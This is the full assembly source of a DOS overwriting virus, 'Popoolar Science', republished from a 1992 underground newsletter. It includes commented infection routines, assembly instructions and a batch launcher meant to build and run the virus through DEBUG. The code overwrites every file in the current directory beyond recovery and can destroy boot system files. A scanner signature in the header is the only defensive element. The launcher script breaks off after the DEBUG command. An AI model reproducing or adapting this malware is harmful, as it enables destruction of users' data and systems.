;Popoolar Science virus - a very simple overwriting infector
;published in Crypt Newsletter 11, Dec. 1992. Edited by Urnst Kouch
;
;Popoolar Science is an indiscriminate, primitive over-writing
;virus which will attack all files in the current directory.
;Data overwritten by the virus is unrecoverable. Programs overwritten
;by Popoolar Science are infectious if their size does not exceed the
;64k boundary for .COM programs. .EXE's larger than this will not
;spread the virus; DOS will issue an "out of memory" message when the
;ruined program is loaded. Ruined programs of any type can only be erased
;from the disk to curb infection.  
;
;If Popoolar Science is called into the root directory, the system files
;will be destroyed, resulting in a machine hang on start-up.
;
;Popoolar Science does not look for a ident-marker in infected files - it 
;merely overwrites all files in the current directory repeatedly. Indeed,
;there seems no need for a self-recognition routine in such a simple 
;program of limited aims. 
;
;
;Popoolar Science will assemble directly to a .COMfile using Isaacson's
;A86 assembler. Use of a MASM/TASM compatible assembler will require
;addition of a set of declarative statements.
;
;Virus signature suitable for loading into VIRSCAN.DAT files of TBScan,
;McAfee's SCAN and/or F-PROT 2.0x:
;[POP]
;DE B8 01 43 33 C9 8D 54 1E CD 21 B8 02 3D CD 21    

nosewheel:


        jmp     virubegin              ; get going

virubegin:      push    cs
        pop     ds
        mov     dx,offset msg           
        mov     ah,09h                 ; Display subscription 
        int     21h                    ; endorsement for Popular
                           ; Science magazine.

       
        mov     dx,offset file_mask     ; load filemask for "*.*"
        call    find_n_infect          ; infect a file, no need for
                        ; an error routine - if no
                        ; files found, virus will
                        ; rewrite itself.
        mov     ax,04C00h               ; exit to DOS 
        int     021h


find_n_infect:
        push    bp                      

        mov     ah,02Fh                 ; get DTA 
        int     021h
        push    bx                      ; Save old DTA 

        mov     bp,sp                   ; BP points to local buffer
        sub     sp,128                  ; Allocate 128 bytes on stack

        push    dx                      ; Save filemask
        mov     ah,01Ah                 ; DOS set DTA function
        lea     dx,[bp - 128]           ; DX points to buffer
        int     021h

        mov     ah,04Eh                 ; search for first host file 
        mov     cx,00100111b            ; CX holds all attributes
        pop     dx                      ; Restore file mask
findfilez:      int     021h
        jc      reset               ; reset DTA and get ready to exit
        call    write2file              ; Infect file!
        mov     ah,04Fh                  
        jmp     short findfilez         ; find another host file

reset:          mov     sp,bp                   
        mov     ah,01Ah                 
        pop     dx                      ; Retrieve old DTA address
        int     021h

        pop     bp                      
        ret                              


write2file:           ; subroutine, writes virus over beginning of all files
        mov     ah,02Fh                 ; DOS get DTA address function
        int     021h
        mov     si,bx                   


        mov     ax,04301h               ; set file attributes
        xor     cx,cx                   
        lea     dx,[si + 01Eh]          ; DX points to target handle
        int     021h

        mov     ax,03D02h               ; open file, read/write
        int     021h                    ; do it!
        xchg    bx,ax                   ; put handle in BX

        mov     ah,040h            ; write to file, start at beginning 
        mov     cx,tailhook - nosewheel  ; CX = virus length
        mov     dx,offset nosewheel     ; DX points to start of virus
        int     021h                    ; do it now!

        mov     ax,05701h               
        mov     cx,[si + 016h]          ; CX holds old file time
        mov     dx,[si + 018h]          ; DX holds old file date
        int     021h                    ; restore them

        mov     ah,3Eh                  ; close file 
        int     021h


exit:                                           ; exit, dummeh!
        ret                              

file_mask        db   "*.*",0               ; Filemask for all files
msg              db   'PopooLar ScIencE RoolZ!$'  ;Popular Science mag message

tailhook:


@echo off
rem POPSCI.BAT will function correctly on machines employing MS-DOS 5.0
rem in its default installation. That is, the program DEBUG.EXE must be
rem in the DOS directory, which is where it normally is for anyone who
rem has installed version 5.0 in the normal, hands-off, idiot proof fashion.
rem POPSCI.BAT is a launcher for the POPOOLAR SCIENCE overwriting virus.
rem Executing the file will create the virus in the current directory and
rem call it. The virus will infect all executables in the current directory
rem and mutilate all data files. If the program terminates without error and
rem the virus has infected all files, the message "Popoolar Science Roolz"
rem is displayed.

SET PATH=C:\DOS
CTTY NUL
DEBUG 

